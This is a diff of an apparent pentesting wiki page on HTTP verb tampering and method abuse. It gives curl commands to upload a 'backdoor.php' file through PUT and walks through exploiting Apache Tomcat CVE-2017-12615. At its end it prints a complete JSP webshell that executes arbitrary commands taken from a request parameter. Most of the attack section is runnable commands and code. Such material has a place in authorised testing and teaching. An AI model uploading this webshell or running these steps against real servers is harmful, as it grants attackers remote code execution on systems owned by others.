@@ -1,62 +1,82 @@
-# 🛠️ HTTP methods abuse
+# HTTP methods
 
 ## Theory
 
-Some HTTP methods \(a.k.a. verbs\) can be used for malicious purposes: PUT, DELETE, etc.
+### Verb tampering
 
-The HTTP methods abuse is not aimed at gaining access to a specific page like verb tampering but more like what methods are accepted by the server and how can we profit from those
+Some websites filter access to resources but fail at filtering out all HTTP methods. When an attacker tries to access a resource with different methods (GET, POST, HEAD, etc.) to bypass the access control, this is called HTTP verb tampering.
 
-{% embed url="https://github.com/ShutdownRepo/httpmethods" %}
+### Methods abuse
 
-## Pratique
+Some HTTP methods can be used for malicious purposes: `PUT`, `DELETE`, etc. The HTTP methods abuse is not aimed at gaining access to a specific page like verb tampering but more like what methods are accepted by the server and how can an attacker profit from those.
 
-### Reconnaissance
+## Practice
 
-The HTTP method `OPTIONS` allows anyone to know which request methods are supported by the server.
+### Recon
 
-```text
-curl -X OPTIONS https://example.com -i
+Testing for HTTP verb tampering and method abuse can be done with [httpmethods](https://github.com/ShutdownRepo/httpmethods).
+
+```bash
+httpmethods -u "https://target.url/"
+httpmethods -u "https://target.url/restricted_page"
 ```
 
-#### PUT
+A manual HTTP request with the `OPTIONS` method can also be used to enumerate what methods are supported. This works if the `OPTIONS` methods is allowed in the first place.
+
+```bash
+curl --include --request OPTIONS "https://target.url/"
+```
+
+### Abusing the `PUT` method
 
 The `PUT` method can be used to upload arbitrary files. Some directories have different rights, it can be useful to test the method on a wide range of directories.
 
-**Uploading a file with a specific extension**
-
-[davtest](https://gitlab.com/kalilinux/packages/davtest) is a tool for HTTP method testing \(specific to WebDAV\).
-
-> This program attempts to exploit WebDAV enabled servers by:
->
-> * attempting to create a new directory \(MKCOL\)
-> * attempting to put test files of various programming langauges \(PUT\)
-> * optionally attempt to put files with .txt extension, then move to executable \(MOVE\)
-> * check if files executed or were uploaded properly - optionally upload a backdoor/shell file for languages which execute
-
-```text
-davtest.pl -url https://example.com
+```bash
+curl --include --upload-file "backdoor.php" "https://target.url/"
 ```
 
-#### DELETE
+### Apache Tomcat JSP PUT - CVE-2017-12615
 
-The DELETE method can be used to delete a resource, which can be useful from an attacker's point of view \(denial of service, sabotage...\).
+Abusing the `PUT` method also applies to **CVE-2017-12615**: When running Apache Tomcat 7.0.0 to 7.0.79 on Windows with HTTP PUTs enabled (e.g. via setting the read-only initialization parameter of the Default to false) it was possible to upload a JSP file to the server via a specially crafted request. This JSP could then be requested and any code it contained would be executed by the server.
 
-### CVE-2017-12615 - Apache Tomcat PUT
+Exploitation of this vulnerability can be achieved manually by creating a `.jsp` file and by uploading it to the target server.
 
-This vulnerability targets Apache Tomcat 7.0.0 to 7.0.79 running on Windows. By design, you are not allowed to upload JSP files via the PUT method on the Apache Tomcat servers. This is likely a security measure to prevent an attacker from uploading a JSP shell and gaining remote code execution on the server. However, due to the insufficient checks, an attacker could gain remote code execution on Apache Tomcat servers from version 7.0.0 to version 7.0.79 where the PUT method is enabled.
+{% code title="test.jsp" %}
+```java
+<% out.write("<html><body><h3>JSP upload successfully</h3></body></html>"); %>
+```
+{% endcode %}
 
-The request to upload a JSP file to the server is as simple as that:
-
-```text
-PUT /myfile.jsp/
-Host: domain-name:port
-Connection: close
-Content-Length: 85
-
-<% out.write("<html><body><h3>[+] JSP upload successfully.</h3></body></html>"); %>
+```bash
+curl --include --upload-file "test.jsp" "https://target.url/"
 ```
 
-You can also exploit it using curl: [https://github.com/breaktoprotect/CVE-2017-12615\#exploit-using-curl](https://github.com/breaktoprotect/CVE-2017-12615#exploit-using-curl)
+If the upload is successful, the following JSP webshell ([source](https://github.com/tennc/webshell/blob/master/fuzzdb-webshell/jsp/cmd.jsp)) can then be uploaded to attempt at execute arbitrary commands on the remote server.
 
-{% embed url="https://github.com/breaktoprotect/CVE-2017-12615" %}
-
+{% code title="webshell.jsp" %}
+```java
+<%@ page import="java.util.*,java.io.*"%>
+<HTML><BODY>
+<FORM METHOD="GET" NAME="myform" ACTION="">
+<INPUT TYPE="text" NAME="cmd">
+<INPUT TYPE="submit" VALUE="Send">
+</FORM>
+<pre>
+<%
+if (request.getParameter("cmd") != null) {
+        out.println("Command: " + request.getParameter("cmd") + "<BR>");
+        Process p = Runtime.getRuntime().exec(request.getParameter("cmd"));
+        OutputStream os = p.getOutputStream();
+        InputStream in = p.getInputStream();
+        DataInputStream dis = new DataInputStream(in);
+        String disr = dis.readLine();
+        while ( disr != null ) {
+                out.println(disr); 
+                disr = dis.readLine(); 
+                }
+        }
+%>
+</pre>
+</BODY></HTML>
+```
+{% endcode %}
